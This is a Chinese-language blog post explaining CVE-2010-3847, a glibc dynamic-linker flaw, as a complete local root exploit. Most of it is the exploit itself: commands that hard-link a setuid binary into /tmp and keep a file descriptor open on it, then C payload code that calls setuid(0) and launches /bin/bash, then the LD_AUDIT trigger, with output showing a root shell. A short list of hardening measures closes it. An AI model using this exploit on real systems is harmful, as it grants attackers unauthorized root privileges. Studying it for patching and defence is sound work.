---
layout: post
title: "CVE-2010-3847 gcc漏洞提权"
categories: security 
tags: 
---

## 概述：
elf/dl-load.c in ld.so in the GNU C Library (aka glibc or libc6) through 2.11.2, and 2.12.x through 2.12.1, does not properly handle a value of $ORIGIN for the LD_AUDIT environment variable, which allows local users to gain privileges via a crafted dynamic shared object (DSO) located in an arbitrary directory.

## 摘要：
$ORIGIN是代表在文件系统多级结构中所加载的可执行程序的位置的ELF替换序列。glibc的动态链接器展开特权应用的$ORIGIN替换的方式存在漏洞，本地用户可以通过创建到setuid应用的硬链接并通过LD_AUDIT强制展开$ORIGIN来获得权限提升，具体过程如下：

在/tmp下创建可控制的目录
{% highlight bash %}
$ mkdir /tmp/exploit
{% endhighlight %}

链接到suid二进制程序以更改$ORIGIN的定义
{% highlight bash %}
$ ln /bin/ping /tmp/exploit/target
{% endhighlight %}

打开到目标二进制程序的文件描述符
{% highlight bash %}
$ exec 3< /tmp/exploit/target
{% endhighlight %}

现在可通过/proc访问描述符
{% highlight bash %}
$ ls -l /proc/$$/fd/3
lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target*
{% endhighlight %}

删除之前所创建的录
{% highlight bash %}
$ rm -rf /tmp/exploit/
{% endhighlight %}

/proc链接仍存在，但已标记为已被删除
{% highlight bash %}
$ ls -l /proc/$$/fd/3
lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target (deleted)
{% endhighlight %}

使用负载DSO替换目录，使$ORIGIN成为到dlopen()的有效目标
{% highlight bash %}
$cat > payload.c
void __attribute__((constructor)) init()
{
 setuid(0);
 system("/bin/bash");
}
^D
$ gcc -w -fPIC -shared -o /tmp/exploit payload.c
$ ls -l /tmp/exploit
-rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*
{% endhighlight %}

通过LD_AUDIT强制/proc中的链接加载$ORIGIN
{% highlight bash %}
$ LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
sh-4.1# whoami
root
sh-4.1# id
uid=0(root) gid=500(taviso)
{% endhighlight %}


## 防御措施：
- 权限最小化使用限制原则。
- 限制root ssh远程，启用sudo
- 使用key方式ssh登录
- mv /usr/bin/gcc /usr/bin/gccbackup && chmod 700 /usr/bin/gccbackup
